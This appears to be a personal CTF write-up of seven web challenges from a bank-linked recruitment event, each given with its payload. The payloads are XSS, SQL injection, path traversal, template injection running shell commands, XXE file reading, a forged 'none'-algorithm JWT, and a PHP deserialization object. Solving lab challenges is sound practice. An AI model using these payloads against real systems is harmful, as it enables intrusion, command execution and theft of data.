# Description

[CTF_{BGK}](https://securitum.page/) was the chellenge for the people which are interested in working for BGK Bank. I did it just for improving myself and practice security skills.


# Challenges

* [Xcross-this](http://139.177.183.71:3000/?LogOut=1) - XSS - <code v-if="false">`CTF_{Str0ngInMathzYouAre}`</code><code v-else>`CTF_{Str0ngInMa************Are}`</code>
    ```
    \unicode{<img src=1 onerror='document.getElementById("LogOut").click()'>}
    ```
* [Database](http://139.177.183.71:4000/) - SQLi - <code v-if="false">`CTF_{0w0cow3Czwartki}`</code><code v-else>`CTF_{0w0cow3C********}`</code>
    ```
    ?query=1%27%29+union+SELECT+title%2C+text%2C+hidden%2C+image+FROM+offers+--
    ```
* [deardir](http://139.177.183.71:7000/) - LFI - <code v-if="false">`CTF_{ThisIsThePath}`</code><code v-else>`CTF_{ThisIsT******}`</code>
    ```
    ?file=../../../tmp/flag
    ```

* [Welcome, I, you](http://139.177.183.71:10000/) - SSTI - <code v-if="false">`CTF_{OhGo0dYouAre}`</code><code v-else>`CTF_{OhGo0d******}`</code>
    ```python
    /greeting/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D
    ```

* [External Entity](http://139.177.183.71:5000/) - XXE - <code v-if="false">`CTF_{ExternalButEazy}`</code><code v-else>`CTF_{Externa********}`</code>
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE x [
    <!ENTITY x SYSTEM "/tmp/flag">
    ]>
    <creds>
        <user>admin &x;</user>
        <pass>admin</pass>
    </creds>
    ```

* [I'm brOken'](http://139.177.183.71:9000/app.js) - JWT with nOnE alg - <code v-if="false">`CTF_{QnIwa2VuQXV0aFRva2Vu==}`</code><code v-else>`CTF_{QnIwa2V************==}`</code>, (just modify `alg = nOnE` and `username = admin`)
    ```
    eyJhbGciOiJuT25FIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNzEwNTg3MTE1fQ.D978VBZPH0Z4qxHIgRkdt-4xtaxPdAAEHs3UpFJ9hX8
    ```

* [Why s0 deserious?](http://139.177.183.71:11000/) - <code v-if="false">`CTF_{0hYouSerializ3dit}`</code><code v-else>`CTF_{0hYouSe**********}`</code>
    ```
    ?data=O%3A8%3A%22FileRead%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A17%3A%22%2Fvar%2Fwww%2Fflag.txt%22%3B%7D
    ```
